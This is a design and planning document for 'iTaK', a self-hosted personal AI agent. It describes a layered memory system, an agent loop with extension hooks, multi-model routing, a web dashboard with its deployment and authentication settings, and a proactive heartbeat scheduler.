# iTaK - Master Gameplan

## At a Glance
- Audience: Users, operators, developers, and contributors working with iTaK.
- Scope: This page explains `iTaK - Master Gameplan`.
- Last reviewed: 2026-02-16.

## Quick Start
- Docs hub: [../WIKI.md](../WIKI.md)
- Beginner path: [../NOOBS_FIRST_DAY.md](../NOOBS_FIRST_DAY.md)
- AI-oriented project map: [../AI_CONTEXT.md](../AI_CONTEXT.md)

## Deep Dive
The detailed content for this topic starts below.

## AI Notes
- Use explicit file paths and exact command examples from this page when automating tasks.
- Treat scale/compliance statements as environment-dependent unless paired with test or audit evidence.


> **The Best of All Worlds:** A personal AI agent that combines the elegance of OpenClaw's memory, the power of Agent Zero's architecture, the simplicity of Nanobot, and the security of building it yourself.

---

## Table of Contents

| § | Section | Description |
|---|---------|-------------|
| 0 | Philosophy & Architecture | Design principles, inspiration, architecture diagram |
| 1 | Memory System | 4-layer brain: SQLite + Neo4j + Weaviate + External |
| 2 | Agent Loop | Monologue engine with 24 extension hooks |
| 3 | Multi-Model Router | 4-model routing via LiteLLM |
| 4 | Web Dashboard | Forked from Agent Zero's Alpine.js UI |
| 5 | Heartbeat Engine | 30-min proactive checks |
| 6 | Adapters | Discord, Telegram, Slack, CLI |
| 7 | Remember This | Conversational memory capture |
| 8 | Skills | Memory-first self-extending skills |
| 9 | Tool System | Dynamic tool loading + MCP |
| 10 | Code Quality Gate | Auto-lint with ruff, semgrep, mypy |
| 11 | Visual Testing | Screenshot-based UI verification |
| 12 | Multi-Agent | Sub-agent delegation with profiles |
| 13 | Security | Defense in depth, skill scanner |
| 14 | Steering Vectors | Personality vectors for local models |
| 15 | Self-Healing | 5-step auto-recovery pipeline |
| 16 | Live Progress | Anti-silence protocol |
| 17 | Crash Resilience | 5-layer crash defense |
| 18 | Auto-Hosting | Dokploy + Caddy deployment |
| 19 | Mission Control | Kanban task board |
| 20 | MCP & A2A | External tool/agent connectivity |
| 21 | Workflow Automation | n8n & Zapier webhooks |
| 22 | Agent Swarms | Parallel sub-agent coordination |
| 23 | MemGPT Memory | Self-managing memory tiers |
| 24 | Logging | 14 event types, dual storage |
| 25 | Multi-User | 3-level RBAC |
| 26 | Multi-Room | Per-room isolation, presence |
| 27 | Conversation Continuity | Crash-safe transcripts |
| 28 | Installation | Docker install, setup wizard |

---

## §0 - Philosophy & Architecture Overview


> *"Use OpenClaw as your blueprint, not your dependency."* - Cole Medin
>
> *"The power of giving an AI agent full access to Linux - it basically has unlimited tools."* - Agent Zero team
>
> *"Build something yourself so you truly understand and control the solution."* - Every transcript

**iTaK is not a clone.** It cherry-picks the best patterns from 6+ frameworks, adapted to David's infrastructure (VPS, iTaK Dell mini PC, Neo4j, Discord, Ollama).

---

### Architecture Diagram


```
┌─────────────────────────────────────────────────────────┐
│                    iTaK CORE                          │
│                                                         │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────┐ │
│  │  MEMORY  │  │HEARTBEAT │  │ ADAPTERS │  │ SKILLS │ │
│  │  SYSTEM  │  │  ENGINE  │  │          │  │        │ │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └───┬────┘ │
│       │              │             │             │      │
│  ┌────┴──────────────┴─────────────┴─────────────┴────┐ │
│  │              AGENT LOOP (Monologue)                │ │
│  │    ┌─────────────────────────────────────────┐     │ │
│  │    │  Extension Hooks (24 lifecycle points)  │     │ │
│  │    └─────────────────────────────────────────┘     │ │
│  └────────────────────┬───────────────────────────────┘ │
│                       │                                  │
│  ┌────────────────────┴───────────────────────────────┐ │
│  │              MULTI-MODEL ROUTER                    │ │
│  │  Chat: Opus/GPT │ Utility: Flash/Mini │ Browser   │ │
│  │  Embeddings: Local FastEmbed (384-dim, ONNX)       │ │
│  └────────────────────────────────────────────────────┘ │
│                                                         │
│  ┌──────────────────────────────────────────────────┐   │
│  │           TOOL EXECUTION ENGINE                  │   │
│  │  Code (Python/Node/Shell) │ Browser │ MCP │ API  │   │
│  └──────────────────────────────────────────────────┘   │
│                                                         │
│  ┌──────────────────────────────────────────────────┐   │
│  │              SECURITY LAYER                      │   │
│  │  Secret Store │ Docker Sandbox │ Rate Limiter    │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

---

### MIT-Licensed Reference Codebases

Both repos are cloned locally and MIT-licensed. **iTaK may freely pull any code, patterns, or assets from either.**

| Repo | Local Path | License | Lang | Key Stats |
|------|-----------|---------|------|-----------|
| **Agent Zero** | `d:\.no\agent-zero` | MIT | Python | 84 helpers, 23 tools, 24 extension hooks, 102 prompts |
| **OpenClaw** | `d:\.no\openclaw` | MIT | TypeScript | 50+ src modules, 49-file memory system, 15-file security, 8 channel adapters |

#### Agent Zero - Source Map

| Directory | Files | What to Steal |
|-----------|-------|---------------|
| `python/tools/` | 23 | `code_execution_tool.py` (496 lines, multi-session SSH/local), `browser_agent.py` (17KB Playwright), `scheduler.py` (12KB cron), `a2a_chat.py`, `skills_tool.py`, `memory_*.py` |
| `python/extensions/` | 24 dirs | Lifecycle hooks: `monologue_start/`, `message_loop_prompts_after/` (memory recall), `tool_execute_before/`, `system_prompt/`, `reasoning_stream/`, etc. |
| `python/helpers/` | 84 | `memory.py` + `memory_consolidation.py` (54KB combined), `secrets.py` (21KB), `mcp_handler.py` (47KB), `websocket_manager.py` (43KB), `task_scheduler.py` (49KB), `history.py` (18KB), `settings.py` (32KB), `skills.py` (16KB), `browser.py` (14KB) |
| `prompts/` | 102 | Full template system: `agent.system.tool.*.md` auto-discovered, `memory.*` consolidation/filtering, `fw.*` framework messages, `behaviour.*` runtime personality |
| `agents/` | 4 profiles | `agent0/` (orchestrator), `developer/`, `hacker/` (Kali Linux pen-testing), `researcher/` - each with own tools/prompts/extensions |
| `webui/` | Full UI | Alpine.js chat dashboard (already referenced in §4) |
| `models.py` | 32KB | Settings model: 4-model architecture, rate limiters, context window configs |
| `agent.py` | 38KB | Core agent loop: `monologue()`, tool dispatch, intervention handling, history compression |

#### OpenClaw - Source Map

| Directory | Files | What to Steal |
|-----------|-------|---------------|
| `src/memory/` | 49 | `manager.ts` (75KB - full memory lifecycle), `qmd-manager.ts` (34KB - QMD memory query), `embeddings.ts` (8KB), `sqlite-vec.ts`, `session-files.ts`, `sync-memory-files.ts` |
| `src/security/` | 15 | `audit.ts` (37KB - security auditing), `skill-scanner.ts` (12KB - skill safety), `fix.ts` (15KB - auto-remediation), `windows-acl.ts` (7KB) |
| `src/discord/` | - | Full Discord adapter (iTaK §6 reference) |
| `src/telegram/` | - | Telegram adapter |
| `src/slack/` | - | Slack adapter |
| `src/signal/`, `src/whatsapp/`, `src/imessage/`, `src/line/` | - | Additional channel adapters |
| `src/browser/` | - | Browser automation engine |
| `src/providers/` | - | LLM provider abstraction layer |
| `src/tts/` | - | Text-to-speech integration |
| `src/plugins/` + `src/plugin-sdk/` | - | Plugin system w/ SDK (iTaK skill reference) |
| `packages/clawdbot/` | - | Primary bot package |
| `ui/` | - | Web UI components |
| `AGENTS.md` | 17KB | Agent instructions & behavioral rules |

> [!TIP]
> **How to use these repos:** When implementing any iTaK section, first check if Agent Zero or OpenClaw already solved the problem. Copy the pattern, adapt to Python/iTaK conventions, add iTaK-specific improvements (Neo4j graph memory, Heartbeat Engine, etc.).

---

### Lessons from Agent Zero Transcripts

> Source: 6 transcripts (pen-testing demo by Sterling Goetz, development guide, v0.9.8 release, VPS deployment, settings deep dive, local models guide, secrets management). Full transcripts archived at `d:\.no\zero.md`.

#### Architecture & Dev Workflow

1. **Hybrid Docker dev setup** - A0 runs locally in VS Code for debugging; forwards code execution to a Docker container via RFC (encrypted password). iTaK should adopt this pattern for development. The IDE debugger can stop at any breakpoint while tool execution happens in Kali Linux.

2. **Plugin system (v0.9.8+)** - Everything moving to plugins: memory, MCP, scheduler, tools. Core becomes lightweight (~25% of framework), plugins define capabilities. Goal: update plugins independently of core. iTaK should plan for this from day one.

3. **WebSocket comms** - Frontend/backend migrated from HTTP polling to WebSocket. All small calls still use JSON API. iTaK dashboard (§4) should adopt WebSocket for live streaming from the start.

4. **Git projects** - Clone any Git repo directly into agent workspace. If repo contains `agents/`, `tools/`, `extensions/` folders, they auto-integrate. iTaK should support this pattern.

5. **`§§include()` syntax** - Large tool outputs (>500 chars) auto-saved to temp files, referenced by placeholder. Saves tokens, prevents context overflow. Subordinate agents pass results to superiors via file references instead of rewriting full text.

#### Security & Secrets

6. **Secrets management (v0.9.5)** - Two stores: Variable store (non-sensitive, visible to LLM) + Secret store (masked after save). Placeholders like `{{secret_name}}` replaced just before tool execution, **never exposed to the LLM**. Output scanning re-masks any leaked values. Compatible with browser-use. iTaK §13 (Security) should implement this pattern.

#### Tool System

7. **Progressive tool discovery** - Before using any CLI tool, run `--help` to learn current flags. Closes the gap between LLM training cutoff and current tool versions. Bake this into iTaK §9 (Tool System) as a default behavior.

8. **Skills standard** - Replaced A0's old "instruments" with cloth skills standard. Zip-file import, agent loads skill into context window on demand. Infinite skills, only loaded when needed. iTaK should adopt.

#### Model Optimization

9. **4-model cost optimization** - Chat (frontier model for reasoning), Utility (cheap/local for memory consolidation, keyword extraction, summarization), Browser (vision-capable), Embeddings (local, zero cost). Each independently configurable. Already in iTaK §3, confirm alignment.

10. **Metrics-driven model testing** - Metrics JSON tracks per-model: tool syntax accuracy, error handling quality, tool selection, methodology adherence. Run same prompt against different models, compare scores. iTaK should build similar for model evaluation.

#### Deployment & Operations

11. **VPS deployment pattern** - Docker + Tailscale VPN for secure remote access. Bind container ports to Tailscale IP only → blocks public access. UFW firewall with explicit port allowlists. Docker Compose with persistence volume mapping. Reference for iTaK §18 (Auto-Hosting).

12. **Message queue UX** - Messages sent during agent execution go to queue instead of immediate intervention. User can send multiple queued messages, send immediately (interrupt), or delete from queue. Better UX than raw intervention.

13. **Memory consolidation** - Auto-memorize (agent decides when to save), auto-consolidation (merge similar memories by similarity threshold), configurable recall intervals, post-filtering/reranking of search results. Agent differentiates "conversation memories" from "solutions for past problems." Reference for iTaK §1 and §23.

---

## §1 - Memory System - The 4-Layer Brain

> **The killer differentiator.** Everyone uses markdown files. We go further with Neo4j for relationships and Weaviate for semantic search.

### Layer 1: Markdown Files (Source of Truth)

Stolen from: **OpenClaw + Cole Medin + Nanobot**

```
ITAK/
├── memory/
│   ├── SOUL.md          # Agent identity, personality, values (evolves over time)
│   ├── USER.md          # Who David is, preferences, projects, goals
│   ├── MEMORY.md        # Key decisions, lessons learned, important facts
│   ├── AGENTS.md        # Behavioral rules, global instructions
│   └── daily/           # Session logs organized by date
│       ├── 2026-02-12.md
│       └── ...
```

- **Why markdown?** It IS the database. Human-readable, version-controllable, any agent can understand it.
- Every conversation updates these files. The agent evolves its understanding of you daily.
- Synced via Obsidian (Cole Medin's pattern) for local access when using CLI tools.

### Layer 2: SQLite (Local Index + Fast Retrieval)

Stolen from: **OpenClaw + Cole Medin + Nanobot**

- Indexes all markdown content for fast keyword search
- Stores embeddings for lightweight RAG (hybrid search: `0.7 × vector + 0.3 × BM25`)
- Uses **FastEmbed** (384-dim, ONNX) - fully local, zero API calls
- Powers the `memory_load` tool with threshold, limit, and filter parameters
- **SQLite locally, Postgres when deployed to VPS** (Cole Medin's dual-stack pattern)

### Layer 3: Neo4j (Knowledge Graph - Relationships)

Stolen from: **David's existing VPS infrastructure + GraphRAG patterns**

> Already deployed on your VPS. This is iTaK's superpower over every other personal AI.

```
(David)-[:WORKS_ON]->(Polymarket)
(David)-[:OWNS]->(iTaKPC)
(iTaKPC)-[:RUNS]->(Ollama)
(Polymarket)-[:USES_API]->(CLOB_Client)
(CLOB_Client)-[:DOCUMENTED_IN]->(MegaDoc)
```

- **Multi-hop reasoning**: "What tools does the project that David is working on use?" → traverses graph
- **Temporal relationships**: When David learned something, how knowledge evolved
- **Entity resolution**: Links concepts across conversations (e.g., "the trading bot" = Polymarket Agent)
- **Native vector search**: Neo4j 5.11+ includes HNSW-based vector search on node properties
- **GraphRAG pipeline**: Combines explicit graph relationships with implicit semantic similarity
- APOC plugins already installed on your VPS instance

**Use cases unique to Neo4j:**
- "What did I learn about security from the OpenClaw research?" → graph traversal across sessions
- "Which of my projects use Docker?" → relationship query, not keyword search
- "Show me how my understanding of agent architecture evolved" → temporal graph

### Layer 4: Weaviate (Vector Search - Semantic Understanding)

**NEW addition** - complements Neo4j with purpose-built vector capabilities.

> **What is Weaviate?** An open-source, AI-native vector database. Think of it as a specialized search engine for meaning, not just keywords. It stores data objects alongside their vector embeddings and supports hybrid search out of the box.

**Why Weaviate alongside Neo4j?**

| Capability | Neo4j | Weaviate | Together |
|-----------|-------|----------|----------|
| Relationship queries | ✅ Native | ❌ | Graph traversal |
| Semantic similarity | ⚠️ Basic (since 5.11) | ✅ Purpose-built | Best-in-class search |
| Hybrid search (vector + BM25) | ❌ | ✅ Native | Smart retrieval |
| Multi-modal (text + images) | ❌ | ✅ | Search across media types |
| Billion-scale vectors | ⚠️ Limited | ✅ HNSW + sharding | Scales with your data |
| Knowledge graph | ✅ Native | ❌ | Entity relationships |

**How they work together:**
1. **Weaviate** handles: "Find me everything semantically similar to 'Docker deployment patterns'" → returns ranked results
2. **Neo4j** handles: "Now show me how those results relate to my active projects" → graph context
3. **Combined query**: "What deployment patterns did I use for projects similar to iTaK?" → Weaviate finds semantic matches → Neo4j resolves project relationships

**Weaviate deployment:**
- Self-hosted via Docker (just like Neo4j on your VPS)
- Built-in embedding service (or bring your own via Ollama)
- Python SDK, GraphQL API, REST API
- Supports collections, filtering, and auto-vectorization

```python
# Example: Hybrid search for memories
response = collection.query.hybrid(
    query="agent architecture patterns",
    alpha=0.7,  # 70% vector, 30% keyword
    limit=5
)
```

### Memory Flow

```
User Message
     │
     ▼
┌──────────────┐    ┌──────────────┐    ┌───────────────┐
│   SQLite     │    │   Weaviate   │    │    Neo4j      │
│  (fast BM25  │    │  (semantic   │    │  (graph       │
│   + basic    │    │   vector     │    │   traversal   │
│   vectors)   │    │   search)    │    │   + context)  │
└──────┬───────┘    └──────┬───────┘    └──────┬────────┘
       │                   │                    │
       └───────────────────┴────────────────────┘
                           │
                    ┌──────┴──────┐
                    │   RANKER    │
                    │  (merge +   │
                    │   rerank)   │
                    └──────┬──────┘
                           │
                    ┌──────┴──────┐
                    │  Markdown   │
                    │  Files      │
                    │  (write     │
                    │   back)     │
                    └─────────────┘
```

---

## §2 - Agent Loop - The Monologue Engine

Stolen from: **Agent Zero** (the most sophisticated loop we found)

### Core Loop

```python
while True:
    # 1. EXTENSION HOOKS: monologue_start
    await run_extensions("monologue_start")

    # 2. PREPARE CONTEXT
    system_prompt = build_system_prompt()  # Jinja2 templates
    history = compress_history(budget)      # Topic-based compression
    memories = search_memories(context)     # 4-layer memory query

    # 3. LLM CALL (streaming)
    response = await call_llm(
        model=config.chat_model,           # Opus/GPT for reasoning
        system=system_prompt,
        messages=history,
        stream=True,
        callbacks=[rate_limiter, intervention_check]
    )

    # 4. DETECT REPEATED RESPONSES
    if is_repeated(response):
        warn_and_adjust()

    # 5. PARSE TOOL CALLS (dirty JSON extraction)
    tool_request = json_parse_dirty(response)

    # 6. EXECUTE TOOL (if found)
    if tool_request:
        # Check MCP tools first, then local tools
        result = await execute_tool(tool_request)

    # 7. CHECK FOR COMPLETION
    if tool_request.name == "response" and tool_request.break_loop:
        break  # Only way out

    # 8. EXTENSION HOOKS: message_loop_end
    await run_extensions("message_loop_end")
```

### Extension Hooks (24 Points)

Stolen from: **Agent Zero** - drop a Python file in a folder, it runs at that lifecycle point.

```
extensions/
├── agent_init/                    # When agent starts up
├── monologue_start/               # Before each monologue
├── monologue_end/                 # After each monologue
├── message_loop_start/            # Before each loop iteration
├── message_loop_end/              # After each loop iteration
├── message_loop_prompts_before/   # Before prompt assembly
├── message_loop_prompts_after/    # After prompt assembly
├── before_main_llm_call/          # Right before LLM call
├── response_stream/               # During streaming response
├── response_stream_chunk/         # Each chunk
├── response_stream_end/           # Stream complete
├── reasoning_stream/              # During reasoning (if supported)
├── tool_execute_before/           # Before tool runs
├── tool_execute_after/            # After tool runs
├── hist_add_before/               # Before adding to history
├── hist_add_tool_result/          # When tool result added
├── system_prompt/                 # Modify system prompt
├── error_format/                  # Format error messages
├── banners/                       # Display banners
├── process_chain_end/             # Chain complete
└── user_message_ui/               # UI message formatting
```

**Why this matters:** Want to log every LLM call? Drop a file in `before_main_llm_call/`. Want to filter secrets from responses? Drop one in `response_stream_chunk/`. Zero core code changes needed.

### History Management

Stolen from: **Agent Zero** - topic-based compression with budget allocation

```
Context Budget Allocation:
├── 50% - Current conversation topic
├── 30% - Recent topic summaries (LLM-compressed)
└── 20% - Deep history (bulk summaries)
```

- Uses the **utility model** (cheap) for compression - not the expensive chat model
- Topics are sealed when subordinate agents complete tasks
- Large messages are auto-compressed when they exceed `LARGE_MESSAGE_TO_TOPIC_RATIO`
- Configurable constants: `BULK_MERGE_COUNT=3`, `TOPICS_KEEP_COUNT=3`

---

## 3  Multi-Model Router

Stolen from: **Agent Zero** (4-model architecture) - massive cost savings

| Role | Model | Purpose | Cost |
|------|-------|---------|------|
| **Chat** | Opus 4.6 / GPT-5 / Local Llama | Main reasoning, complex tasks | $$$ |
| **Utility** | Kimi K2.5 / GPT-4o-mini / Local Qwen | Memory consolidation, compression, background tasks | $ |
| **Browser** | Opus 4.6 / GPT-4o | Web automation, page understanding (needs vision) | $$ |
| **Embeddings** | FastEmbed (ONNX) / Ollama | Vector generation for memory search | FREE (local) |

**Why this matters:** Agent Zero's David said it - *"This is a huge advantage over OpenClaw, which burns way more tokens because it doesn't have clever delegation."*

### How Models Are Configured (LiteLLM + Web Dashboard)

All 4 models are configured through the **Web Dashboard** (§3.5) - no config files to edit manually.

For each model, you set:

| Setting | Example | Description |
|---------|---------|-------------|
| **Provider** | `openrouter`, `ollama`, `anthropic`, `openai`, `azure` | Dropdown of all supported providers |
| **Model Name** | `google/gemini-3-pro-preview` | Exact model name from the provider |
| **API Key** | `sk-or-...` | Per-provider API key (stored in secret store) |
| **API Base URL** | `http://192.168.0.217:11434` | For local/custom providers (Ollama, vLLM, etc.) |
| **Context Length** | `100000` | Max tokens - history auto-compresses to fit |
| **History Allocation** | `0.7` (70%) | How much context goes to chat history vs system prompt |
| **Vision** | `true/false` | Whether model can process images (required for browser model) |
| **Rate Limits** | `requests: 60/min, input: 100k/min` | Per-model rate limiting to avoid API throttling |
| **Extra Params** | `temperature=0, top_p=0.9` | Any LiteLLM-supported parameter |

Under the hood, **LiteLLM** abstracts all providers into a single interface:

```python
# LiteLLM lets you use ANY provider with the same code:
from litellm import completion

# OpenRouter
response = completion(model="openrouter/google/gemini-3-pro-preview", messages=msgs)

# Local Ollama
response = completion(model="ollama/qwen3-8b", messages=msgs, api_base="http://192.168.0.217:11434")

# Direct Anthropic
response = completion(model="anthropic/claude-opus-4.6", messages=msgs)

# All use the SAME interface - swap providers by changing ONE string
```

### Local Model Path (iTaK Dell Mini PC)

```
iTaK (192.168.0.217) running Ollama:
├── Chat: qwen3-8b or llama3.1-8b
├── Utility: qwen3-1.5b or phi-3-mini
├── Browser: qwen3-vl-8b (needs vision capability)
├── Embeddings: nomic-embed-text
└── Optional: LLM steering vectors for personality (Tier 3)
```

### Cloud Model Path (for heavy tasks)

```
Via Open Router or Direct API:
├── Chat: claude-opus-4.6 or gpt-5
├── Utility: kimi-k2.5 (very cheap)
├── Browser: gpt-4o (vision + cheap enough for rapid calls)
└── Embeddings: still local (FastEmbed)
```

---

## §4 - Web Dashboard - Forked from Agent Zero

Stolen from: **Agent Zero** (full-featured web UI with Alpine.js)

> **Implementation: Fork Agent Zero's `webui/` directory.** Don't build from scratch - Agent Zero already has a complete Alpine.js dashboard with chat, settings, sidebar, modals, notifications, projects, and WebSocket streaming. We copy their `webui/` folder and customize it for iTaK's needs.
>
> **Agent Zero webui structure (what we inherit):**
> - `index.html` + `index.js` + `index.css` - main app shell
> - `login.html` + `login.css` - authentication page
> - `components/` - 12 component dirs (chat, settings, sidebar, modals, notifications, projects, sync, tooltips, welcome, dropdown, messages, _examples)
> - `js/` - 21 modules (WebSocket, API, messages, speech, Alpine store, device detection, shortcuts, transformers)
> - `css/` - 10 stylesheets (buttons, messages, modals, notifications, scheduler, settings, speech, tables, toast)
> - `vendor/` + `public/` - third-party libraries and static assets
>
> **What we customize:** Add iTaK-specific tabs (Mission Control, Logs, Users, Rooms, Costs), swap Agent Zero's agent API for iTaK's FastAPI backend, add our theme/branding, and wire up the new extension hooks.

### Dashboard Structure

iTaK ships with a web dashboard accessible at `http://localhost:PORT`. This is where you:
- Chat with iTaK (main interface)
- Configure all 4 models (provider, API key, model name, rate limits)
- Manage skills, extensions, and MCP servers
- View agent logs and debug output
- Backup and restore settings

### Dashboard Tabs (copied from Agent Zero)

| Tab | Purpose | Key Features |
|-----|---------|-------------|
| **Agent Settings** | Configure the 4 models + memory + speech | Provider dropdown, model name, API key, ctx length, vision toggle, rate limits per model |
| **Skills** | Manage skill files | Browse, edit, enable/disable skills |
| **External Services** | API keys for external tools | Open Router, Perplexity, SearXNG URL, etc. |
| **MCP/A2A** | MCP server configuration | Add/remove MCP servers, manage tool discovery |
| **Developer** | Debug mode, raw logs | See agent reasoning, tool calls, extension hooks |
| **Backup & Restore** | Export/import settings | One-click backup of all configuration |

### Agent Settings Sub-Sections

```
Agent Settings tab:
├── Agent Config     → Agent name, behavior settings
├── Chat Model       → Provider, name, API key, ctx, vision, rate limits
├── Utility Model    → Same fields as Chat Model (but cheaper model)
├── Browser Model    → Same fields (must have vision=true)
├── Embedding Model  → Provider, name, dimensions
├── Memory           → SQLite path, Neo4j URL, Weaviate URL, thresholds
├── Speech           → TTS/STT settings (optional)
└── Workdir          → Working directory path, file browser settings
```

- **Frontend**: Alpine.js + vanilla HTML/CSS (no build step, no React, no npm)
- **Backend**: Python FastAPI serving the web UI + API endpoints
- **Components**: Modular HTML files loaded as web components
- **State**: Alpine.js stores (reactive, no Redux needed)
- **Settings**: Saved via API → stored in `config.json` on disk

**Why Alpine.js?** Because it's tiny (15KB), requires no build step, and the entire dashboard is vanilla HTML that the agent itself can modify. This means iTaK can improve its own dashboard.

### Dashboard Security - Headless-First, Remote by Default

> **Most iTaK installations run headless - a VPS, Raspberry Pi, Dell Mini PC, or any box tucked in a closet. You access it from your phone, tablet, or another PC. The security model is built for this.**

#### Deployment Modes (auto-detected at first launch)

iTaK asks "How are you deploying?" during first-launch CLI setup and configures security accordingly:

```
┌─────────────────────────────────────────────────────────────────┐
│  iTaK First Launch - Deployment Mode Selection                  │
│                                                                 │
│  How are you deploying iTaK?                                    │
│                                                                 │
│  [1] 🏠 HOME SERVER (LAN)                                       │
│      Running on a local machine (Pi, mini PC, NAS)              │
│      Accessed from devices on the same WiFi/network             │
│      → Binds to 0.0.0.0, allows LAN subnet, password required   │
│                                                                 │
│  [2] 🌐 VPS / CLOUD                                            │
│      Running on a remote server (DigitalOcean, Hetzner, etc.)   │
│      Accessed from anywhere over the internet                   │
│      → Binds to 127.0.0.1, requires reverse proxy (Caddy/Nginx) │
│      → HTTPS mandatory, extra auth layer recommended            │
│                                                                 │
│  [3] 💻 LOCAL DEV                                              │
│      Running on your own desktop/laptop (you're sitting at it)  │
│      → Binds to 127.0.0.1, minimal security, auto-open browser  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### Default Config Per Mode

```python
DEPLOYMENT_MODES = {
    "home_server": {
        "bind_host": "0.0.0.0",              # Accept connections from any device
        "allowed_networks": ["LAN_AUTO"],     # Auto-detects your subnet (e.g. 192.168.0.0/24)
        "password_required": True,
        "https": False,                       # HTTPS optional on LAN (no certs needed)
        "auto_open_browser": False,           # No local browser (headless)
    },
    "vps_cloud": {
        "bind_host": "127.0.0.1",            # Only reverse proxy connects directly
        "allowed_networks": ["127.0.0.1"],    # Caddy/Nginx handles external access
        "password_required": True,
        "https": True,                        # HTTPS mandatory (via reverse proxy)
        "auto_open_browser": False,           # No local browser (headless)
        "reverse_proxy_guide": True,          # Prints Caddy/Nginx config on setup
    },
    "local_dev": {
        "bind_host": "127.0.0.1",            # Localhost only
        "allowed_networks": ["127.0.0.1"],
        "password_required": True,
        "https": False,
        "auto_open_browser": True,            # Opens browser on launch
    },
}
```

#### Random 5-Digit Port (unique per installation)

Every iTaK installation gets a **random port** on first launch - no two users share the same port:

```python
# On first install (runs once → saves to config.json):
import random, socket

def generate_dashboard_port():
    """Generate a random 5-digit port that isn't already in use."""
    while True:
        port = random.randint(10000, 65535)  # Always 5 digits
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(("0.0.0.0", port)) != 0:
                return port

# Your install → 50749
# Your friend → 25743
# Someone else → 38291
# Stored in config.json, never changes unless you want it to
```

#### Auth & Access Control

```python
DASHBOARD_SECURITY = {
    # === BINDING ===
    "bind_host": "0.0.0.0",              # All interfaces (headless-friendly)
    "port": 50749,                        # Random 5-digit port (from first launch)

    # === PASSWORD AUTH ===
    "password_required": True,            # Always on - no exceptions
    "password_hash": "bcrypt:$2b$...",    # bcrypt hash (never stored plaintext)
    "session_timeout_hours": 72,          # 3 days (longer for headless - less annoying)
    "max_login_attempts": 5,              # Lockout after 5 failed attempts
    "lockout_minutes": 15,                # 15-min lockout

    # === NETWORK SECURITY ===
    "allowed_networks": [
        "127.0.0.1",                      # Always allow localhost
        "192.168.0.0/24",                 # Auto-detected LAN subnet
        # VPS mode: only "127.0.0.1" (reverse proxy handles external)
    ],
    "cors_origins": ["*"],                # Permissive for LAN (tightened for VPS)
    "rate_limit_per_minute": 30,          # Brute force protection

    # === API SECURITY ===
    "api_token": "sky-...",               # For programmatic access (Discord bot, scripts)
    "api_token_hash": "bcrypt:$2b$...",   # Also hashed
}
```

#### Security Layers (defense in depth)

```
Layer 1: RANDOM PORT - different per install, can't guess
Layer 2: NETWORK FILTER - only allowed subnets can connect
Layer 3: PASSWORD - bcrypt-hashed, lockout after 5 attempts
Layer 4: SESSION - JWT tokens, auto-expire after 72 hours
Layer 5: RATE LIMIT - 30 req/min on login endpoint
Layer 6: REVERSE PROXY (VPS only) - HTTPS + additional auth via Caddy/Nginx
```

#### How Each Deployment Mode Accesses the Dashboard

**🏠 Home Server (most common - your iTaK Dell Mini PC, Raspberry Pi, NAS):**

```
Your devices (phone/tablet/PC) are on the same WiFi:
  → Open browser on phone: http://192.168.0.217:50749
  → Login with your password
  → Done. Works from any device on your network.

iTaK auto-detects your LAN subnet at first launch:
  "Detected network: 192.168.0.0/24 - allowing all devices on this subnet"
```

**🌐 VPS / Cloud (your DigitalOcean/Hetzner server):**

```
iTaK binds to 127.0.0.1 (internal only)
Caddy reverse proxy handles external access:

# Caddyfile (auto-generated during setup):
iTaK.yourdomain.com {
    reverse_proxy 127.0.0.1:50749
    # Caddy auto-provisions HTTPS via Let's Encrypt
}

You access from anywhere:
  → Open browser: https://iTaK.yourdomain.com
  → Login with your password
  → Or use Discord/Telegram adapter (no dashboard needed)
```

**💻 Local Dev (rare - sitting at the machine):**

```
  → Dashboard auto-opens in your browser: http://localhost:50749
  → Standard localhost-only binding
```

#### First-Launch Setup (works over SSH - no GUI needed)

```
$ ssh user@192.168.0.217
$ cd iTaK && python -m app.main

╔══════════════════════════════════════════════════════════════╗
║  iTaK - First Launch Setup                                ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  Step 1/5: Deployment mode                                   ║
║  How are you deploying iTaK?                               ║
║  [1] Home Server (LAN)  [2] VPS/Cloud  [3] Local Dev        ║
║  > 1                                                         ║
║                                                              ║
║  Step 2/5: Dashboard password                                ║
║  Set a password for the web dashboard:                       ║
║  > ********                                                  ║
║  Confirm: > ********                                         ║
║                                                              ║
║  Step 3/5: Port assignment                                   ║
║  Generated random port: 50749 ✓ (port is free)               ║
║                                                              ║
║  Step 4/5: Network detection                                 ║
║  Detected LAN subnet: 192.168.0.0/24                         ║
║  Allowing connections from all devices on this network ✓     ║
║                                                              ║
║  Step 5/5: API token                                         ║
║  Generated API token: sky-a8f3b2c1d4e5... (save this!)       ║
║  (This is shown ONCE - store it somewhere safe)              ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  ✅ Dashboard: http://192.168.0.217:50749                    ║
║  ✅ Open this URL on your phone/tablet/PC to get started     ║
║                                                              ║
║  Config saved to: config.json                                ║
╚══════════════════════════════════════════════════════════════╝
```

#### Mobile / Tablet Access

The dashboard is **responsive** - designed to work on phones and tablets:

```
Dashboard UI priorities:
├── Desktop (1920x1080) - full sidebar + chat + settings panels
├── Tablet (768x1024) - collapsible sidebar, stacked panels
└── Mobile (375x812) - full-screen chat, settings in slide-out menu

All controls are touch-friendly:
  - Large tap targets (48px minimum)
  - Swipe gestures for sidebar
  - No hover-dependent interactions
```

---

## §5 - Heartbeat Engine - Proactive Agent

Stolen from: **OpenClaw + Cole Medin + Mimubot concept**

### Schedule

```
Every 30 minutes (cron or scheduled task):
1. Check HEARTBEAT.md for pending tasks
2. Query integrations:
   - Discord: unread mentions, server events
   - Email: new messages (via API)
   - Calendar: upcoming events
   - GitHub: PR notifications, issues
   - Polymarket: position changes, market movements
3. Send prompt to agent with context:
   "Look at my memory, recent activity, and integrations.
    Is there anything that needs my attention?
    Should I do anything proactive?"
4. If action needed → notify via Discord
   If nothing → log HEARTBEAT_OK
```

### Proactive Behaviors (from Mimubot's vision, better execution)

- **Pattern learning**: Notice David always organizes files a certain way → start doing it
- **Deadline awareness**: *"Meeting in 15 min - prep doc is empty"*
- **Draft generation**: Draft emails, PRs, docs based on context
- **Knowledge synthesis**: *"Based on today's research, here's what's relevant to iTaK"*
- **Market monitoring**: *"Your Polymarket position on X moved significantly"*

### Heartbeat Uses Utility Model (cheap)

